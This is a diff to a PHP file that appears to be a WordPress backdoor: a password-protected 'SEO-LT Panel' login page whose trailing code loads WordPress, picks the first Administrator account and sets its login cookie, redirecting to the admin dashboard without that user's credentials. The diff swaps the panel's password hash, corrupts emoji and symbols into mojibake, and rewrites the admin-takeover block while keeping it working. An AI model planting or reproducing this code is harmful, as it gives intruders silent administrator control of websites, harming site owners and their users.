@@ -1,6 +1,6 @@
 <?php
 session_start();
-$hashed_password = '$2y$10$gPtjr.PZbo/9BLZp5Om6GO6SB4WJrSUXyRLJeoSS.khtAN/ZodUUu';
+$hashed_password = '$2y$10$fZ/ez7MrWDlly5MOHOaaZOdgNwmcWJTklpMB/oOL0V9HnNS5Crvmy';
 
 // Cek login
 if (!isset($_SESSION['auth'])) {
@@ -48,17 +48,17 @@ body{margin:0;padding:0;height:100vh;display:flex;justify-content:center;align-i
 
 <!-- Marquee -->
 <div class="marquee-container">
-    <div class="marquee">copyright © SEO-LT - Protected by Advanced Security</div>
+    <div class="marquee">copyright Â© SEO-LT - Protected by Advanced Security</div>
 </div>
 
 <!-- Login Form -->
 <div class="login-container">
-    <div class="icon">🔒</div>
+    <div class="icon">ðŸ”’</div>
     <h3>SEO-LT Panel</h3>
     <form action="" method="post">
         <input type="password" name="pass" placeholder="Masukkan Password" required>
         <br>
-        <input type="submit" name="submit" value="🛡️ MASUK">
+        <input type="submit" name="submit" value="ðŸ›¡ï¸ MASUK">
     </form>
 </div>
 
@@ -69,8 +69,8 @@ body{margin:0;padding:0;height:100vh;display:flex;justify-content:center;align-i
 
 <!-- Music Controls -->
 <div class="audio-container">
-    <button onclick="toggleMusic()" title="Play/Pause">🎵</button>
-    <button onclick="muteMusic()" title="Mute">🔇</button>
+    <button onclick="toggleMusic()" title="Play/Pause">ðŸŽµ</button>
+    <button onclick="muteMusic()" title="Mute">ðŸ”‡</button>
 </div>
 
 <script>
@@ -109,23 +109,24 @@ video.addEventListener('ended', () => video.play());
     }
 }
 ?>
-
 <?php
-// AUTO LOGIN WORDPRESS ADMIN (setelah login sukses)
-$mr = $_SERVER['DOCUMENT_ROOT'];
+$mr=$_SERVER['DOCUMENT_ROOT'];
 @chdir($mr);
-if (file_exists('wp-load.php')) {
-    require_once('wp-load.php');
-    $wp_user_query = new WP_User_Query(array('role' => 'Administrator', 'number' => 1, 'fields' => array('ID')));
-    $results = $wp_user_query->get_results();
-    
-    if (!empty($results)) {
-        wp_set_auth_cookie($results[0], true);
-        wp_redirect(admin_url());
-        exit;
-    }
-    echo '<h1>NO ADMIN FOUND</h1>';
-} else {
-    echo '<h1>WordPress NOT FOUND</h1>';
+if (file_exists('wp-load.php')){
+	include 'wp-load.php';
+	$wp_user_query = new WP_User_Query( array( 'role' => 'Administrator', 'number' => 1, 'fields' => 'ID' ) );
+	$results= $wp_user_query->get_results();
+
+	if ( isset( $results[0] ) ) {
+		wp_set_auth_cookie( $results[0] );
+		wp_redirect( admin_url() );
+		die();
+	}
+	die( 'NO ADMIN' );
+
 }
+else{
+	die('Failed to load');
+}
+
 ?>
